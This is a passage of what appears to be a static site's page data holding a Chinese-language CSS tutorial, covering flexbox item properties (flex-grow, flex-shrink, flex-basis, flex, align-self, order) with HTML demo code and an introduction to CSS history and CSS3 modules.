vertical-align也会对flex项无效，不过对flex项内部文本等内联元素有效\n    \n    <html>\n    <head>\n        <style type="text/css">\n        .parent { display: flex; border: 1px solid red; width: 500px; }\n        span { border: 1px solid green; width: 85px; height: 85px; line-height: 85px; vertical-align: middle; }\n        .div { width: 100px; height: 100px; border: 1px solid blue; margin: 10px; }\n        a { border: 1px solid green; width: 30px; height: 30px; line-height: 30px; vertical-align: middle; }\n        </style>\n    </head>\n    <body>\n        <div class="parent">\n            <span>this is text.</span>\n            <div class="div"></div>\n            <a>link</a>\n        </div>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n\n 4. 大部分与布局有关的属性都会在flex项上失效，但是除了绝对定位以外，它在flex容器中不参与flex布局，脱离文档流，但是会受到flex的一部分影响。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        .parent { display: flex; border: 1px solid red; width: 500px; }\n        span { border: 1px solid green; width: 85px; height: 85px; line-height: 85px; vertical-align: middle; }\n        .div {\n            position: absolute;\n            align-self: center; /* 仍然有影响 */\n            width: 100px;\n            height: 100px;\n            border: 1px solid blue;\n            margin: 10px;\n        }\n        a { border: 1px solid green; width: 30px; height: 30px; line-height: 30px; vertical-align: middle; }\n        </style>\n    </head>\n    <body>\n        <div class="parent">\n            <span>this is text.</span>\n            <div class="div"></div>\n            <a>link</a>\n        </div>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    \n\n\n# 3.2 flex-grow\n\nflex-grow属性设置在flex项上，指定flex项的增长因子，默认值是0，也可以是小数，但是不能是负数。如果flex容器有剩余空间，那么会让这些空间按照各个flex项增长因子所占据的比例来分配。\n\n<html>\n<head>\n  <style>\n  div { background-color: rgba(0,0,0,0.1); }\n  article  { font-size: 15px; text-align: center; }\n  p { width: 750px; }\n  article > div { display: flex; width: 750px; border: 1px dashed; }\n  div > div { border: 1px solid; margin: 5px; padding: 30px 0; width: 90px; box-sizing: border-box; }\n  </style>\n</head>\n<body>\n  <article>\n    <p>flex container</p>\n    <div>\n      <div style="flex-grow: 0">flex-grow: 0</div>\n      <div style="flex-grow: 0">flex-grow: 0</div>\n      <div style="flex-grow: 0">flex-grow: 0</div>\n    </div>\n  </article>\n  <article>\n    <p>flex container</p>\n    <div>\n      <div style="flex-grow: 0">flex-grow: 0</div>\n      <div style="flex-grow: 0">flex-grow: 0</div>\n      <div style="flex-grow: 1">flex-grow: 1</div>\n    </div>\n  </article>\n  <article>\n    <p>flex container</p>\n    <div>\n      <div style="flex-grow: 1">flex-grow: 1</div>\n      <div style="flex-grow: 1">flex-grow: 1</div>\n      <div style="flex-grow: 3">flex-grow: 3</div>\n    </div>\n  </article>\n  <article>\n    <p>flex container</p>\n    <div>\n      <div style="flex-grow: 0.5">flex-grow: 0.5</div>\n      <div style="flex-grow: 0.5">flex-grow: 0.5</div>\n      <div style="flex-grow: 1.5">flex-grow: 1.5</div>\n    </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n以上代码效果图：\n\n\n\n# 3.3 flex-shrink\n\nflex-shrink属性也是设置在flex项上的，指定flex项的收缩因子，默认值是1，可以是小数，但是不能是负数。如果flex容器一行的空间不够也没有进行换行，那么会让各个flex项按照各自的收缩因子所占据的比例来进行收缩。实在压缩不了就会溢出（前提是nowrap）。\n\n<html>\n<head>\n  <style>\n  div { background-color: rgba(0,0,0,0.1); }\n  article  { font-size: 15px; text-align: center; }\n  p { width: 750px; }\n  article > div { display: flex; width: 750px; border: 1px dashed; }\n  div > div { border: 1px solid; margin: 5px; padding: 30px 0; width: 290px; box-sizing: border-box; }\n  </style>\n</head>\n<body>\n  <article>\n    <p>flex container</p>\n    <div>\n      <div style="flex-shrink: 0">flex-shrink: 0</div>\n      <div style="flex-shrink: 0">flex-shrink: 0</div>\n      <div style="flex-shrink: 0">flex-shrink: 0</div>\n    </div>\n  </article>\n  <article>\n    <p>flex container</p>\n    <div>\n      <div style="flex-shrink: 0">flex-shrink: 0</div>\n      <div style="flex-shrink: 0">flex-shrink: 0</div>\n      <div style="flex-shrink: 1">flex-shrink: 1</div>\n    </div>\n  </article>\n  <article>\n    <p>flex container</p>\n    <div>\n      <div style="flex-shrink: 1">flex-shrink: 1</div>\n      <div style="flex-shrink: 1">flex-shrink: 1</div>\n      <div style="flex-shrink: 3">flex-shrink: 3</div>\n    </div>\n  </article>\n  <article>\n    <p>flex container</p>\n    <div>\n      <div style="flex-shrink: 0.5">flex-shrink: 0.5</div>\n      <div style="flex-shrink: 0.5">flex-shrink: 0.5</div>\n      <div style="flex-shrink: 1.5">flex-shrink: 1.5</div>\n    </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n以上代码效果图：\n\n\n在flex-wrap那节提过“flex项不换行，flex项不见得是溢出，可能是调整大小”，原因是flex-shrink默认值是1，flex容器宽度不够所有flex项的显式设置总宽时，就会压缩各自的宽度（在主轴上占用空间）。\n\n<html>\n<head>\n    <style>\n    /*没有溢出，调整了大小*/\n    .outer { width: 300px; display: flex; background-color: skyblue; flex-wrap: nowrap; }\n    .outer div { box-sizing: border-box; height: 100px; width: 100px; }\n    .div1 { border: 1px solid red; }\n    .div2 { border: 1px solid blue; }\n    .div3 { border: 1px solid green; }\n    .div4 { border: 1px solid yellow; }\n    </style>\n</head>\n<body>\n    <div class="outer">\n      <div class="div1">1</div>\n      <div class="div2">2</div>\n      <div class="div3">3</div>\n      <div class="div4">4</div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 3.4 flex-basis\n\nflex-basis属性也是设置在flex项上的，用于决定flex项的初始大小或默认大小，这个大小是相对于“盒模型”而言（标准盒模型还是ie盒模型）。它的优先级会高于width设置（column排列时就是height），可以使用具体长度数值或者百分数。但是它的优先级不会高于min-width、min-height、max-width、max-height。\n\n<html>\n<head>\n  <style>\n  body { font-size: 20px; text-align: center; }\n  div { background-color: rgba(0,0,0,0.1); }\n  article  { width: 520px; box-sizing: content-box; }\n  article > div {\n    display: flex;\n    border: 1px dashed;\n    padding: 2px;\n    min-height: 100px;\n  }\n  div > div {\n    border: 1px solid;\n    margin: 2px;\n    padding: 40px 0;\n    font-size: 1rem;\n  }\n  </style>\n</head>\n<body>\n<article>\n  <p>flex container</p>\n  <div>\n    <div style="width: 100px">width: 100px</div>\n    <div style="width: 200px">width: 200px</div>\n    <div style="width: 300px">width: 300px</div>\n  </div>\n</article>\n<article>\n  <p>flex container</p>\n  <div>\n    <div style="width: 100px;\n    flex-basis: 200px;">width: 100px;<br>\n    flex-basis: 200px;</div>\n    <div style="width: 200px;\n    flex-basis: 300px;">width: 200px;<br>\n    flex-basis: 300px;</div>\n    <div style="width: 300px;\n    flex-basis: 100px;">width: 300px;<br>\n    flex-basis: 100px;</div>\n  </div>\n</article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\nflex-basis：content中的content取值在很多浏览器中都没有实现，我们只是简单了解一下，它其实相当于flex-basis: auto; width: auto;，意思是flex项的大小完全取决于内容的大小。\n\nflex-basis：auto比较常见，也是默认设置。表示flex项大小为“未成为flex项之前的大小”，也就是说会看width和height的值，如果width和height的值为auto，那么flex-basis：auto最后还是会取决于内容的大小。\n\n<html>\n<head>\n  <style>\n    body { font-size: 20px; text-align: center;}\n    div { background-color: rgba(0,0,0,0.1); }\n    article  { width: 540px; box-sizing: content-box; }\n    article > div {\n      display: flex;\n      outline: 1px dashed;\n      padding: 3px;\n      min-height: 100px;\n    }\n    div > div {\n      outline: 1px solid;\n      margin: 3px;\n      padding: 30px 0;\n      font-size: 1rem;\n    }\n  </style>\n</head>\n<body>\n<article>\n  <p>flex-basis: auto;没有显式设置宽度</p>\n  <div>\n    <div style="flex-basis: auto">\n      flex-basis: auto<br>\n      width: auto\n    </div>\n    <div style="flex-basis: auto">\n      flex-basis: auto<br>\n      width: auto\n    </div>\n    <div style="flex-basis: auto">\n      flex-basis: auto<br>\n      width: auto\n    </div>\n  </div>\n</article>\n<article>\n  <p>flex-basis: auto;有显式设置宽度</p>\n  <div>\n    <div style="flex-basis: auto; width: 100px;">\n      flex-basis: auto;<br>\n      width: 100px;\n    </div>\n    <div style="flex-basis: auto; width: 150px">\n      flex-basis: auto;<br>\n      width: 150px;\n    </div>\n    <div style="flex-basis: auto; width: 200px">\n      flex-basis: auto;<br>\n      width: 200px;\n    </div>\n  </div>\n</article>\n<article>\n  <p>flex-basis: auto;有显式设置宽度，但过大会自动收缩</p>\n  <div>\n    <div style="flex-basis: auto; width: 2000px">\n      flex-basis: auto<br>\n      width: 2000px\n    </div>\n    <div style="flex-basis: auto; width: 3000px">\n      flex-basis: auto<br>\n      width: 3000px\n    </div>\n    <div style="flex-basis: auto; width: 4000px">\n      flex-basis: auto<br>\n      width: 4000px\n    </div>\n  </div>\n</article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n\n\n以上代码效果图：\n\n\n场景flex-basis: auto; width: auto;下，并且内容都是文本。如果所有flex项的收缩因子都为0，那么都不会换行；如果flex项的收缩因子都不为0，那么按照各自的收缩因子进行收缩，收缩因子都一样大时，flex项里的换行行数相似。\n\n<html>\n<head>\n  <style>\n  body { font-size: 20px; text-align: center; }\n  div { background-color: rgba(0,0,0,0.1); }\n  article  { width: 520px; }\n  article > div { display: flex; border: 1px dashed; padding: 2px; min-height: 100px; flex-wrap: nowrap; }\n  div > div { border: 1px solid; margin: 2px; padding: 10px 0; font-size: 1rem; }\n  p { margin-bottom: 5px; }\n  b { background-color: rgba(255,255,255,0.3); }\n  </style>\n</head>\n<body>\n  <article>\n  <p>same shrink factors</p>\n  <div>\n    <div style="flex-shrink: 1">\n      <b>flex-shrink: 1</b> is set with a few words\n    </div>\n    <div style="flex-shrink: 1; background-color: rgba(0,0,0,0.2);">\n      this has <b>flex-shrink: 1;</b> and <i>background-color: rgba(0, 0, 0, 0.2);</i> set with a lot of additional text, unlike other flex items across a few lines.\n    </div>\n    <div style="flex-shrink: 1">\n      this too has <b>flex-shrink: 1</b> with a medium amount of extra content.\n    </div>\n  </div>\n  </article>\n  <article>\n  <p>different shrink factors</p>\n  <div>\n    <div style="flex-shrink: .5">\n      <b>flex-shrink: 0.5</b> is set with a few words\n    </div>\n    <div style="flex-shrink: 1; background-color: rgba(0,0,0,0.2);">\n      this has <b>flex-shrink: 1;</b> and <i>background-color: rgba(0, 0, 0, 0.2);</i> set with a lot of additional text, unlike other flex items across a few lines.\n    </div>\n    <div style="flex-shrink: 1">\n      this too has <b>flex-shrink: 1</b> with a medium amount of extra content.\n    </div>\n  </div>\n  </article>\n  <article>\n  <p>null shrink factors</p>\n  <div>\n    <div style="flex-shrink: 0"><b>flex-shrink: 0</b> is set with a few words</div>\n    <div style="flex-shrink: 0; background-color: rgba(0,0,0,0.2);">\n      this has <b>flex-shrink: 0;</b> and <i>background-color: rgba(0, 0, 0, 0.2);</i> set with a lot of additional text, unlike other flex items across a few lines.\n    </div>\n    <div style="flex-shrink: 0">\n      this too has <b>flex-shrink: 0</b> with a medium amount of extra content.\n    </div>\n  </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n以上代码效果图：\n\n\n\n# 3.5 flex\n\nflex属性是flex-grow、flex-shrink和flex-basis的缩写，我们强烈建议使用flex来替代那三个属性。\n\n常用写法如下：\n\n/* 一个值, 无单位数字: flex-grow */\nflex: 2;\n\n/* 一个值, width/height: flex-basis */\nflex: 10em;\nflex: 30px;\nflex: min-content;\n\n/* 两个值: flex-grow | flex-basis */\nflex: 1 30px;\n\n/* 两个值: flex-grow | flex-shrink */\nflex: 2 2;\n\n/* 三个值: flex-grow | flex-shrink | flex-basis */\nflex: 2 2 10%;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n回顾一下默认值：\n\n 1. 如果没有声明flex，也没有声明flex-grow，那么增长因子默认为0。如果声明了flex但是省略了增长因子和收缩因子，那么增长因子默认为1。\n 2. 如果没有声明flex，也没有声明flex-shrink，那么收缩因子默认为1。如果声明了flex但是省略了收缩因子，其实收缩因子仍然是1。\n 3. 如果没有声明flex，也没有声明flex-basis，那么基础尺寸为auto。如果声明了flex但是省略了基础尺寸，那么基础尺寸默认为0。\n\nflex属性还有几种取值：\n\n * flex: initial：根据width属性来调整flex项的尺寸，同时允许收缩。其实就是flex: 0 1 auto。\n * flex: auto：根据width属性来调整flex项的尺寸，同时允许收缩和增长。其实就是flex: 1 1 auto。\n * flex: none：根据width属性来调整flex项的尺寸，不允许收缩和增长。其实就是flex: 0 0 auto。\n * flex: <number>：增长因子设置为<number>，收缩因子和基础尺寸都为0。\n\nflex: initial的例子：\n\n<html>\n<head>\n    <style>\n    div { background-color: rgba(0,0,0,0.1); }\n    article > div { display: flex; outline: 1px dashed; padding: 3px;}\n    article { width: 600px; }\n    article:nth-of-type(odd) { width: 300px; }\n    div > div {\n      outline: 1px solid; margin: 3px; line-height: 1.5;\n      min-height: 40px; text-align: center;\n    }\n    .initial div div { flex: 0 1 auto; }\n    .hundred div > div { width: 50px; }\n    p { text-align: left; padding-left: 100px; }\n    </style>\n</head>\n<body>\n    <article class="initial">\n    <p>flex: initial;</p>\n    <div>\n    <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div>\n    <div>e e e e e</div><div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n  <article class="initial">\n  <p>flex: initial;</p>\n    <div>\n    <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div>\n    <div>e e e e e</div><div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n  <article class="initial hundred">\n    <p>flex: initial; width: 50px;</p>\n    <div>\n    <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div>\n    <div>e e e e e</div><div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n  <article class="initial hundred">\n    <p>flex: initial;  width: 50px;</p>\n    <div>\n    <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div>\n    <div>e e e e e</div><div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n以上代码效果图：\n\n\nflex: auto的例子：\n\n<html>\n<head>\n    <style>\n    div { background-color: rgba(0,0,0,0.1); }\n    article > div { display: flex; outline: 1px dashed; padding: 3px;}\n    article { width: 600px; }\n    article:nth-of-type(odd) { width: 300px; }\n    div > div {\n      outline: 1px solid; margin: 3px; line-height: 1.5;\n      min-height: 40px; text-align: center;\n    }\n    .auto div > div { flex: auto; }\n    .hundred div > div { width: 50px; }\n    p { text-align: left; padding-left: 100px; }\n    </style>\n</head>\n<body>\n  <article class="auto">\n    <p>flex: auto;</p>\n    <div>\n      <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div>\n      <div>e e e e e</div><div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n  <article class="auto">\n    <p>flex: auto;</p>\n    <div>\n      <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div>\n      <div>e e e e e</div><div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n  <article class="auto hundred">\n    <p>flex: auto;  width: 50px;</p>\n    <div>\n      <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div>\n      <div>e e e e e</div><div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n  <article class="auto hundred">\n    <p>flex: auto;  width: 50px;</p>\n    <div>\n      <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div>\n      <div>e e e e e</div><div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n以上代码效果图：\n\n\n<html>\n<head>\n    <style>\n    div { background-color: rgba(0,0,0,0.1); }\n    article > div { display: flex; outline: 1px dashed; padding: 3px;}\n    article { width: 600px; }\n    article:nth-of-type(odd) { width: 300px; }\n    div > div {\n      outline: 1px solid; margin: 3px; line-height: 1.5;\n      min-height: 40px; text-align: center;\n    }\n    .none div > div { flex: none; }\n    .hundred div > div { width: 50px; }\n    p { text-align: left; padding-left: 100px; }\n    </style>\n</head>\n<body>\n  <article class="none">\n    <p>flex: none;</p>\n    <div>\n    <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div>\n    <div>e e e e e</div><div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n  <article class="none">\n    <p>flex: none;</p>\n    <div>\n    <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div>\n    <div>e e e e e</div><div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n  <article class="none hundred">\n    <p>flex: none;  width: 50px;</p>\n    <div>\n    <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div>\n    <div>e e e e e</div><div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n  <article class="none hundred">\n    <p>flex: none;  width: 50px;</p>\n    <div>\n    <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div>\n    <div>e e e e e</div><div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n以上代码效果图：\n\n\n<html>\n<head>\n    <style>\n    div { background-color: rgba(0,0,0,0.1); }\n    article > div { display: flex; outline: 1px dashed; padding: 3px;}\n    article { width: 600px; }\n    article:nth-of-type(odd) { width: 300px; }\n    div > div {\n      outline: 1px solid; margin: 3px; line-height: 1.5;\n      min-height: 40px; text-align: center;\n    }\n    article.flex3 > div > div { flex: 3; }\n    p { text-align: left; padding-left: 100px; }\n    </style>\n</head>\n<body>\n  <article class="flex3">\n    <p>flex: 3;</p>\n    <div>\n      <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div><div>e e e e e</div>\n      <div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n  <article class="flex3">\n    <p>flex: 3;</p>\n    <div>\n      <div>a</div><div>b b</div><div>c c c</div><div>d d d d</div><div>e e e e e</div>\n      <div>f f f f</div><div>g g g</div><div>h h</div><div>i</div>\n    </div>\n  </article>\n  <article>\n    <p>flex: 0 - 5;</p>\n    <div>\n      <div style="flex: 0"></div><div style="flex: 1"></div>\n      <div style="flex: 2"></div><div style="flex: 3"></div>\n      <div style="flex: 4"></div><div style="flex: 5"></div>\n    </div>\n  </article>\n  <article></article>\n  <article>\n    <p>flex: 0 - 5;</p>\n    <div>\n      <div style="flex: 0">flex: 0</div><div style="flex: 1">flex: 1</div>\n      <div style="flex: 2">flex: 2</div><div style="flex: 3">flex: 3</div>\n      <div style="flex: 4">flex: 4</div><div style="flex: 5">flex: 5</div>\n    </div>\n  </article>\n  <article>\n    <p>flex: 0 - 5;</p>\n    <div>\n      <div style="flex: 0">flex: 0</div><div style="flex: 1">flex: 1</div>\n      <div style="flex: 2">flex: 2</div><div style="flex: 3">flex: 3</div>\n      <div style="flex: 4">flex: 4</div><div style="flex: 5">flex: 5</div>\n    </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n以上代码效果图：\n\n\n\n# 3.6 align-self\n\nalign-self属性设置在flex项上，用于屏蔽覆盖flex容器的align-items对flex项的影响。align-self具有align-items所有的属性值flex-start | flex-end | center | baseline | stretch，并且还单独有个auto值表示继承flex容器当前align-items的值。\n\n\n# 3.7 order\n\norder属性设置在flex项上，用于更改flex项的顺序。\n\n默认情况下，所有flex项均被分配为“0”的顺序。flex项的order为负值时，将会显示在默认值“0”之前；flex项的order为正值时，将会显示在默认值“0”之后。如果一些flex项的order相同，则按照源顺序显示。\n\n<html>\n<head>\n    <style type="text/css">\n    .outer { display: flex; width: 300px; border: 1px dashed; }\n    .outer div {\n      width: 50px; height: 80px; box-sizing: border-box;\n      text-align: center; margin: 5px; padding: 25px 5px;\n      border: 1px solid; background-color: rgba(0,0,0,0.1);\n    }\n    .inner2 { order: -1; }\n    .inner3 { order: -2; }\n    .inner4 { order: 1; }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner1">1</div>\n        <div class="inner2">2</div>\n        <div class="inner3">3</div>\n        <div class="inner4">4</div>\n        <div class="inner5">5</div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n以上代码效果图：\n',charsets:{cjk:!0}},{title:"CSS简介",frontmatter:{},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/",relativePath:"book-web/html、css、js、ts/学习CSS/README.md",key:"v-2f71c012",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/",headers:[{level:2,title:"CSS是什么",slug:"css是什么",normalizedTitle:"css是什么",charIndex:12},{level:2,title:"CSS的历史",slug:"css的历史",normalizedTitle:"css的历史",charIndex:108},{level:2,title:"CSS3有哪些模块",slug:"css3有哪些模块",normalizedTitle:"css3有哪些模块",charIndex:437},{level:2,title:"CSS长什么样子",slug:"css长什么样子",normalizedTitle:"css长什么样子",charIndex:2403}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"CSS是什么 CSS的历史 CSS3有哪些模块 CSS长什么样子",content:"# CSS简介\n\n\n# CSS是什么\n\nCSS是层叠样式表(Cascading Style Sheets)，用于设置和布置网页，可以对元素位置进行排版，可以为元素添加背景和边框，可以为元素添加动效动画等等。\n\n\n# CSS的历史\n\nCSS1：1996年12月正式推出CSS1，对字体、尺寸、颜色、文本、位置、背景、边框等进行了规范，这个阶段主要使用table和CSS1来定位表单的外观和样式。\n\nCSS2：1998年5月正式推出CSS2，扩展了CSS1，添加了很多新属性和伪元素，这个阶段主要使用div和li来分割元素再搭配CSS2来定义表单界面的外观。\n\nCSS2.1：2004年2月正式推出了CSS2.1，纠正了CSS2中的一些错误，也删除了一些不被浏览器所支持的属性（有些出现在CSS3规范中了）。\n\nCSS3：2010年推出的全新版本CSS3，被分为若干个相互独立的模块，包括盒子模型、列表模块、超链接方式、语言模块、背景和边框、文字特效、多栏布局等模块。\n\n\n# CSS3有哪些模块\n\nCSS3没有采用总体结构，而是采用了分工协作的模块化结构。原因是为了避免浏览器因为不支持一部分功能而不支持整个部分了，先让浏览器支持的模块尽可能多，一些不必要的可以不支持，对于PC端和移动端就是如此。\n\n模块名称                                功能描述\nbasic box model                     定义各种与盒模型相关的样式\nLine                                定义各种与直线相关的样式\nList                                定义各种与列表相关的样式\nHyperlink Presentation              定义各种与超链接相关的样式。譬如锚的显示方式、激活时的视觉效果等\nPresentation Levels                 定义页面中元素的不同的样式级别\nSpeech                              定义各种与语音相关的样式。譬如音量、音速、说话间歇时间属性\nBackground and border               定义各种与背景和边框相关的样式\nText                                定义各种与文字相关的样式\nColor                               定义各种与颜色相关的样式\nFont                                定义各种与字体相关的样式\nPaged Media                         定义各种页眉、页脚、页数等页面元数据的样式\nCascading and inheritance           定义怎样对属性进行赋值\nValue and Units                     将页面上各种各样的值与单位进行统一，以供其他模块使用\nImage Values                        定义对image元素的赋值方式\n2D Transforms                       在页面中实现2维空间上的变形效果\n3D Transforms                       在页面上实现3维空间上的变形效果\nTransitions                         在页面中实现平滑过渡的视觉效果\nAnimations                          在页面中实现动画\nCSSOM View                          查看管理页面或页面的视觉效果，处理元素的位置信息\nSynatax                             定义CSS样式表的基本结构、样式表中的一些语法细节、浏览器对于样式的分析规则\nGenerated and Replaced Content      定义怎样在元素中插入内容\nMarquee                             定义当一些元素的内容太大，超过了指定的元素尺寸时，是否以及怎样显示溢出部分\nRuby                                定义页面中ruby元素（用于显示拼音文字）的样式\nWriting Modes                       定义页面中文本数据的布局方式\nBasic User Interface                定义屏幕、纸张上进行输出时页面的渲染方式\nNamespaces                          定义使用命名空间时的语法\nMedia Queries                       根据媒体类型来实现不同的样式\n‘Reader’Media Type                  定义用于屏幕阅读器之类的阅读程序时的样式\nMulti-column Layout                 在页面中使用多栏布局方式\nTemplate Layout                     在页面中使用特殊布局方式\nFlexible Box Layout                 创建自适应浏览器窗口的流动布局或自适应字体大小的弹性布局\nGrid Position                       在页面中使用网络布局方式\nGenerated Content for Paged Media   在页面中使用印刷时使用的布局方式\n\n\n# CSS长什么样子\n\ncss是由一个选择器(selector)起头，后面接一对大括号{ }，然后在大括号里面定义一些属性和对应的属性值。\n\nh1 {\n    color: red;\n    font-size: 5em;\n}\n\np {\n    color: black;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n",normalizedContent:"# css简介\n\n\n# css是什么\n\ncss是层叠样式表(cascading style sheets)，用于设置和布置网页，可以对元素位置进行排版，可以为元素添加背景和边框，可以为元素添加动效动画等等。\n\n\n# css的历史\n\ncss1：1996年12月正式推出css1，对字体、尺寸、颜色、文本、位置、背景、边框等进行了规范，这个阶段主要使用table和css1来定位表单的外观和样式。\n\ncss2：1998年5月正式推出css2，扩展了css1，添加了很多新属性和伪元素，这个阶段主要使用div和li来分割元素再搭配css2来定义表单界面的外观。\n\ncss2.1：2004年2月正式推出了css2.1，纠正了css2中的一些错误，也删除了一些不被浏览器所支持的属性（有些出现在css3规范中了）。\n\ncss3：2010年推出的全新版本css3，被分为若干个相互独立的模块，包括盒子模型、列表模块、超链接方式、语言模块、背景和边框、文字特效、多栏布局等模块。\n\n\n# css3有哪些模块\n\ncss3没有采用总体结构，而是采用了分工协作的模块化结构。原因是为了避免浏览器因为不支持一部分功能而不支持整个部分了，先让浏览器支持的模块尽可能多，一些不必要的可以不支持，对于pc端和移动端就是如此。\n\n模块名称                                功能描述\nbasic box model                     定义各种与盒模型相关的样式\nline                                定义各种与直线相关的样式\nlist                                定义各种与列表相关的样式\nhyperlink presentation              定义各种与超链接相关的样式。譬如锚的显示方式、激活时的视觉效果等\npresentation levels                 定义页面中元素的不同的样式级别\nspeech                              定义各种与语音相关的样式。譬如音量、音速、说话间歇时间属性\nbackground and border               定义各种与背景和边框相关的样式\ntext                                定义各种与文字相关的样式\ncolor                               定义各种与颜色相关的样式\nfont                                定义各种与字体相关的样式\npaged media                         定义各种页眉、页脚、页数等页面元数据的样式\ncascading and inheritance           定义怎样对属性进行赋值\nvalue and units                     将页面上各种各样的值与单位进行统一，以供其他模块使用\nimage values                        定义对image元素的赋值方式\n2d transforms                       在页面中实现2维空间上的变形效果\n3d transforms                       在页面上实现3维空间上的变形效果\ntransitions                         在页面中实现平滑过渡的视觉效果\nanimations                          在页面中实现动画\ncssom view                          查看管理页面或页面的视觉效果，处理元素的位置信息\nsynatax                             